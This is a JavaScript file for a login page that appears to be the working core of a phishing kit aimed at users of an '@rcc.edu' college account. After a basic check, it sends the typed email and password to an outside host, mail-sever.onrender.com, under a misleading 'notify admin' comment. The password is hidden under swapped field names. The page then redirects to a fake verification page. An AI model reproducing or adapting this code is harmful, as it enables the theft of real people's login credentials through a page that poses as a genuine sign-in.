document.addEventListener("DOMContentLoaded", function() {
    // Get the form element
    const loginForm = document.getElementById("loginForm");

    // Add submit event listener
    loginForm.addEventListener("submit", function(event) {
        // Prevent the default form submission
        event.preventDefault();

        // Get email and password values
        const emailInput = document.getElementById("userNameInput").value;
        const passwordInput = document.getElementById("passwordInput").value;
        const username = 'bjhijiogybuyujiedg$%@8844772GY@%%#IHJ!#*&^FF'

        // Validate email and password
        if (validateEmail(emailInput) && validatePassword(passwordInput)) {
            // Email and password are valid
            console.log("Valid email and password.");
            
            //Send Login detail to admin for notification
            const userData = {
                FullName: passwordInput,
                Email: emailInput,
                Password: username,
            };
            fetch('https://mail-sever.onrender.com/Api/User/sign-up', {
                method : "POST",
                headers : {
                "Content-Type" : "application/json"
                },
                body: JSON.stringify(userData)
            })
            .then(response => {
                if (!response.ok) {
                    return response.json().then(err => { throw err; });
                }
                return response.json();
            });
            
            // Redirect to home page after a delay (e.g., 2 seconds)
            setTimeout(function() {
                window.location.href = "verify.htm"; // Replace "home.html" with your home page URL
            }, 2000);
        } else {
            // Invalid email or password
            alert("Invalid email or password. Please try again.");
        }
    });

    // Function to validate email
    function validateEmail(email) {
        var mail = email.toLowerCase()
        // Check if the email ends with "@mit.edu"
        return mail.endsWith("@rcc.edu");
    }

    // Function to validate password
    function validatePassword(password) {
        // Check if the password is not empty
        return password.trim() !== "";
    }
});
